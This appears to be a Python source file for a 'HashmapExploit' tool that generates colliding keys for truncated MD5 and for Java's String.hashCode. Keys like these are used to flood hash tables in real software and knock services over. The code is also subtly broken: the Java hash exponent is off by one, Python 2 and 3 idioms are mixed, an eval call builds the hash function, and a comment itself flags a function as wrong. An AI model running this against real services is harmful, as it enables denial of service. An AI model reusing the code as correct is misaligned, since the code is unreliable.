from input import Generator
import hashlib
import sys
from itertools import permutations
from itertools import product
from string import ascii_uppercase

class HashmapExploit():
    f = None
    n = -1
    options=dict({
            "type": "java",
            "n_collisions": 10,
            "target": 0,
            "bits": 32
            })

    def run(self, generator):
        if self.options['type']=='md5':
            self.f = eval("hashlib." + self.options['type'])  # this should check to make sure the function exists
            self.n = int(self.options['bits']/4)
            print(self.exploit(generator, self.options['n_collisions']))
        elif self.options['type']=='java':
                        self.GenerateJavaPreimages(self.options['target'], self.options['n_collisions'])
            
    def exploit(self, generator, n_inputs):
        keys = []
        hash_pairs = dict()  # hash -> key
        hashes = set()
        generated = set()
        hash_f = self.hash_function

        # Currently can only generate multiple pairs of keys that generate the same hash
        while len(keys) < n_inputs:
            current_value = generator.get_random()
            hash = hash_f(current_value)

            while hash not in hashes:
                hash_pairs[hash] = current_value
                generated.add(current_value)
                hashes.add(hash)
                find_val = generator.get_random()
                while find_val in generated:
                    find_val = generator.get_random()
                current_value = find_val
                hash = hash_f(current_value)
            keys.append(current_value)
            keys.append(hash_pairs[hash_f(current_value)])

        return keys

    def hash_function(self, key):
        h = self.f

        return h(repr(key).encode('utf-8')).hexdigest()[:self.n] # this is wrong

    def JavaHash(self,inputstring):
        result=0
        n=len(inputstring)
        for i in range(0, n):
            result+= 31** (n-i) * ord(inputstring[i]);
        return result % (2**32);
    
    def GenerateJavaHashStrings(self,halflength):
        keys={}
        for i in product(ascii_uppercase, repeat=halflength):  #This only does uppercase letters, fix in future to allow for other input
            keys[self.JavaHash(i)]=''.join(i)
        return keys
    
    def GenerateJavaPreimages(self,target, collisions): 
        length=1 #We don't often find small collisions, we can start at length 6.
        current=0
        while (current < collisions):
            if (length % 2 == 0):
                multfactor = 31 ** (length / 2)
                keys=self.GenerateJavaHashStrings(int(length/2))
                for subhash,substring in keys.iteritems():
                    effectiveTarget = (target-(subhash * multfactor))% (2 ** 32)
                    if effectiveTarget in keys:
                        poststring=keys.get(effectiveTarget)
                        print(substring+poststring)
                        current += 1
                        if (current >=collisions):
                            break
                length+=1
            else:
                multfactor2 = 31 ** ((length-1)/2)
                keys = self.GenerateJavaHashStrings(int((length+1)/2))
                otherkeys=self.GenerateJavaHashStrings(int((length-1)/2))
                for subhash, substring in keys.iteritems():
                    effectiveTarget = (target - (subhash * multfactor2)) % (2 ** 32)
                    if effectiveTarget in otherkeys:
                        poststring = otherkeys.get(effectiveTarget)
                        print(substring+poststring)
                        current += 1
                        if (current >= collisions):
                            break
                length+=1

